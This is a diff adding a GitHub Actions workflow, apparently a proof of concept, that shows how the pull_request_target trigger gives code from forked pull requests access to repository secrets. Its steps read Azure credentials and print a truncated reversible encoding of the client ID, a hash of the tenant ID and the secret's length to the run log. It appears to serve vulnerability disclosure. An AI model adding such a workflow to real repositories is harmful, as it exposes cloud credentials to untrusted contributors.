@@ -1,0 +1,25 @@
+name: PoC - PR Target Secret Exposure
+
+on:
+  pull_request_target:   # ⚠️ runs with repo secrets, even on PRs from forks!
+
+jobs:
+  secret-exposure:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Encode Secrets
+        run: |
+          # Attacker-controlled PR code will reach here with secrets loaded!
+          echo "AZURE_CLIENT_ID_B64=$(echo -n $AZURE_CLIENT_ID | base64)" >> $GITHUB_ENV
+          echo "AZURE_TENANT_ID_SHA1=$(echo -n $AZURE_TENANT_ID | sha1sum | cut -d' ' -f1)" >> $GITHUB_ENV
+          echo "AZURE_SECRET_LEN=$(echo -n $AZURE_CLIENT_SECRET | wc -c)" >> $GITHUB_ENV
+        env:
+          AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID }}
+          AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
+          AZURE_CLIENT_SECRET: ${{ secrets.AZURE_CLIENT_SECRET }}
+
+      - name: Show Proof of Secret Access
+        run: |
+          echo "Encoded Client ID (first 20 chars): ${AZURE_CLIENT_ID_B64:0:20}..."
+          echo "Tenant ID (SHA1 fingerprint): $AZURE_TENANT_ID_SHA1"
+          echo "Client Secret Length: $AZURE_SECRET_LEN"
